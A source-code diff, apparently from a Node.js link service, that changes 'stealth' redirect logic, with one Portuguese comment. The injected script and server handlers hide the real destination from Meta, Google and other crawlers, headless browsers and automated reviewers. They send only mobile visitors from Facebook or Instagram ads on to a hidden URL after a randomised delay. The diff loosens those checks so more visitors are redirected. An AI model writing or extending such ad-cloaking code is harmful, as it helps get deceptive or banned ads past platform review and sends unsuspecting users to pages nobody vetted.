@@ -2162,7 +2162,8 @@ const STEALTH_DEFAULT_BRIDGE_HTML = `
 
 function buildStealthNavScript(prefix, code) {
   const navPath = '/api/n/' + prefix + '/' + code;
-  return `<script>(function(){try{var p=${JSON.stringify(navPath)};var u=navigator.userAgent.toLowerCase();if(/facebookexternalhit|facebot|facebookcatalog|meta-externalagent|meta-inspector|instagrambot|googlebot|bingbot|yandex|bot|crawl|spider|headless|lighthouse|preview|whatsapp|slurp|duckduck/i.test(u))return;if(navigator.webdriver)return;var q=location.search||'';var ref=document.referrer||'';if(!/fbclid=|utm_source=(FB|facebook|instagram)/i.test(q+ref))return;if(!/mobile|iphone|ipod|android|instagram|fban|fbav|fb_iab|fbios|fb4a/i.test(u))return;fetch(p+q,{method:'POST',credentials:'same-origin',headers:{'Content-Type':'application/json'},body:'{}'}).then(function(r){return r.json()}).then(function(d){if(d&&d.next)setTimeout(function(){location.replace(d.next)},120+(Math.random()*180|0))}).catch(function(){})}catch(e){}})();</script>`;
+  // Só crawlers param no HTML; demais browsers fazem POST — servidor decide (ref, utm, país, etc.)
+  return `<script>(function(){try{var p=${JSON.stringify(navPath)};var u=navigator.userAgent.toLowerCase();if(/facebookexternalhit|facebot|facebookcatalog|meta-externalagent|meta-inspector|instagrambot|googlebot|bingbot|yandex|bot|crawl|spider|headless|lighthouse|preview|whatsapp|slurp|duckduck/i.test(u))return;if(navigator.webdriver)return;fetch(p+(location.search||''),{method:'POST',credentials:'same-origin',headers:{'Content-Type':'application/json'},body:'{}'}).then(function(r){return r.json()}).then(function(d){if(d&&d.next)setTimeout(function(){location.replace(d.next)},120+(Math.random()*180|0))}).catch(function(){})}catch(e){}})();</script>`;
 }
 
 async function getStealthBridgeInnerHtml(site) {
@@ -2988,8 +2989,10 @@ function evaluateLinkVisit(site, ctx) {
   const utmMed = (query.utm_medium || '').toString().trim();
   const metaInApp = isMetaInAppMobileUA(userAgent, headers);
   const isHandheld = metaInApp || deviceType === 'mobile' || deviceType === 'tablet' || !isDesktopUserAgent(userAgent, headers);
-  const fromMetaAds = metaInApp || hasFbclid || refFromMeta ||
-    ((utmSrc === 'FB' || utmSrc === 'FACEBOOK' || utmSrc === 'INSTAGRAM') && (utmMed || hasFbclid));
+  const refTokenMatches = !!(site.required_ref_token && String(query.ref || '').trim() === String(site.required_ref_token).trim());
+  const fromMetaAds = metaInApp || hasFbclid || refFromMeta || refTokenMatches ||
+    utmSrc === 'FB' || utmSrc === 'FACEBOOK' || utmSrc === 'INSTAGRAM' ||
+    (isHandheld && !!(utmMed || query.utm_campaign || query.utm_content));
   const countryOk = !country || allowedList.length === 0 || allowedList.includes(country.toUpperCase());
   const likelyRealFromAds = isHandheld && fromMetaAds && countryOk;
 
@@ -3138,14 +3141,14 @@ async function handleStealthNavigation(req, res) {
   const ua = req.headers['user-agent'] || '';
   if (!ua || ua.length < 10) return res.status(403).json({ error: 'Forbidden' });
   if (!checkTrackPostRateLimit(ip)) return res.status(429).json({ error: 'Too many requests' });
-  if (isMetaCrawlerUA(ua) || isBotUserAgent(ua, req.headers)) return res.json({ next: null });
+  if (isMetaCrawlerUA(ua)) return res.json({ next: null });
 
   const site = await db.get('SELECT * FROM sites WHERE link_code = ? AND is_active = 1', [code]);
   const destUrl = getEffectiveTargetUrl(site);
   if (!site || !destUrl || !isStealthMode(site)) return res.status(404).json({ error: 'Not found' });
   if (!(await validateSiteLinkPrefix(req, site))) return res.status(404).json({ error: 'Not found' });
 
-  const ctx = await resolveLinkVisitContext(req, site, { skipRefCheck: true, enforceRefOnNavigate: true });
+  const ctx = await resolveLinkVisitContext(req, site, { skipRefCheck: false, enforceRefOnNavigate: !!site.required_ref_token });
   void db.run(ctx.visitorSql, ctx.visitorParams).catch((err) => console.error('[visitor] stealth nav:', err.message));
 
   if (ctx.decision.blocked || ctx.decision.reviewerBypass) {
